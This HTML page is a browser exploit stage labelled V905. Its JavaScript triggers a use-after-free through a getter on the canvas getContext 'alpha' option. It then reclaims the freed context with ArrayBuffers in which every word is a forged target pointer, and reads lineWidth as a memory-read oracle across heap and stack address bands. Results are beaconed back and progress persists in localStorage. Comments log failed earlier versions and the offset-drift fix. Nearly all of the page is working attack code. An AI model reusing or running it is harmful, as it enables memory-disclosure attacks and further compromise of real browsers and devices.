<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>V905</title></head>
<body><pre id="out">V905 — offset-invariant forged stateStack scanner</pre>
<script>
'use strict';
var O=document.getElementById('out');
function say(s){O.textContent+='\n'+s;}
var _imgs=[];for(var i=0;i<40;i++)_imgs.push(new Image());
var _ix=0;
function bk(tag,d){
  var img=_imgs[_ix++]||(new Image());
  img.src='/beacon/V905-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now();
}
var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
function f2h(v){_f64[0]=v;return '0x'+('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}

/*
 * V905: fix the two open unknowns of the v650 oracle in one mechanism.
 *
 * v904 established: the AB(768) spray takes the freed 768B ctx slot on 14.22
 * (canvas loses even when sprayed second).  v902/v903: 265 forged reads all
 * crashed — consistent with the m_stateStack offset drifting on this build
 * (forge wrote +112, the ctx reads elsewhere, m_buffer stays 0, null crash).
 *
 * Fix: fill EVERY 8-byte word of the reclaiming AB with the same pointer P.
 * Wherever the ctx reads m_buffer (any 8-aligned offset), it gets P; the
 * capacity/size words also get P's halves (equal, so size<=capacity holds).
 * The lineWidth read then dereferences somewhere near P — crash only if
 * P's neighbourhood is unmapped.  Offset drift can no longer cause the crash.
 *
 * Bands (phase-ordered), localStorage continuation, ?b=N picks the band:
 *   b=0: SceLibcHeap 0x310000000 +-16M @256KB   (129)
 *   b=1: WebProcess heap 0x100000000 +-256M @1MB (513)
 *   b=2: stack band 0x7FFFF0000000..0x7FFFFFFFF000 @256KB (1024)
 *   b=3: wide 512MB steps 1G..64G               (127)
 */

var hi32 = function(a){ return Math.floor(a / 4294967296); };
var lo32 = function(a){ return a >>> 0; };
var TARGETS = [];
function addRange(base, span, step, tag) {
  for (var o = -span; o <= span; o += step) {
    var a = base + o;
    if (a <= 0) continue;
    TARGETS.push([hi32(a), lo32(a), tag + (o >= 0 ? '+' : '-') + (Math.abs(o) / 1048576) + 'M']);
  }
}
var BANDS = [
  function(){ addRange(0x310000000, 0x1000000, 0x40000, 'libcHeap'); },
  function(){ addRange(0x100000000, 0x10000000, 0x100000, 'wpHeap'); },
  function(){ for (var a = 0x7FFFF0000000; a <= 0x7FFFFFFFE000; a += 0x40000) TARGETS.push([hi32(a), lo32(a), 'stack+' + ((a - 0x7FFFF0000000) / 65536) + 'K']); },
  function(){ for (var g = 0x40000000; g <= 0x1000000000; g += 0x20000000) TARGETS.push([hi32(g), lo32(g), 'wide-' + (g / 1073741824) + 'G']); }
];
var band = 0;
try { var mb = location.search.match(/b=(\d)/); if (mb) localStorage.setItem('v905_band', mb[1]); band = parseInt(localStorage.getItem('v905_band')) || 0; } catch(e) {}
if (band < BANDS.length) BANDS[band]();

var MAX = TARGETS.length;
var attempt = 0;
try {
  if (location.search.indexOf('r=1') >= 0) localStorage.setItem('v905_attempt', '0');
  attempt = parseInt(localStorage.getItem('v905_attempt')) || 0;
} catch(e) {}

bk('BOOT', 'band=' + band + ' attempt=' + attempt + '/' + MAX);
if (attempt >= MAX) {
  bk('EXHAUSTED', 'band-' + band + '-all-' + MAX + '-crashed');
  say('Exhausted band ' + band);
} else {
  var tgt = TARGETS[attempt];
  var tgtHi = tgt[0], tgtLo = tgt[1], tgtDesc = tgt[2];
  var tgtHex = '0x' + ('00000000' + tgtHi.toString(16)).slice(-8) + ('00000000' + tgtLo.toString(16)).slice(-8);
  bk('TGT', 'n=' + attempt + '|addr=' + tgtHex + '|' + tgtDesc);
  try { localStorage.setItem('v905_attempt', String(attempt + 1)); } catch(e) {}

  var canvas = document.createElement('canvas');
  canvas.width = 1; canvas.height = 1;
  var innerCtx = null;
  var uafOpts = {};
  Object.defineProperty(uafOpts, 'alpha', {get: function() {
    innerCtx = canvas.getContext('2d');
    return true;
  }});
  canvas.getContext('bitmaprenderer', uafOpts);
  if (!innerCtx) { bk('FAIL', 'no-uaf'); }
  else {
    for (var f = 0; f < 600; f++) { var tmp = new ArrayBuffer(16); }
    var dvs = [];
    for (var s = 0; s < 200; s++) {
      var ab = new ArrayBuffer(768);
      var dv = new DataView(ab);
      /* offset-invariant forge: every 8-byte word = pointer P */
      for (var o = 0; o < 768; o += 8) {
        dv.setUint32(o, tgtLo, true);
        dv.setUint32(o + 4, tgtHi, true);
      }
      dvs.push(dv);
    }
    bk('SPRAY', 'n=200|tgt=' + tgtHex + '|forge=all-words');
    var leaked = innerCtx.lineWidth;
    innerCtx = null;
    for (var c = 0; c < dvs.length; c++) {
      for (var o2 = 0; o2 < 768; o2 += 8) dvs[c].setFloat64(o2, 0, true);
    }
    var leakedHex = f2h(leaked);
    bk('HIT', 'addr=' + tgtHex + '|lw=' + leaked + '|hex=' + leakedHex);
    say('HIT ' + tgtHex + ' -> ' + leakedHex);
    try { localStorage.setItem('v905_attempt', String(MAX + 1)); localStorage.setItem('v905_hit', tgtHex + '|' + leakedHex); } catch(e) {}
  }
}
</script></body></html>
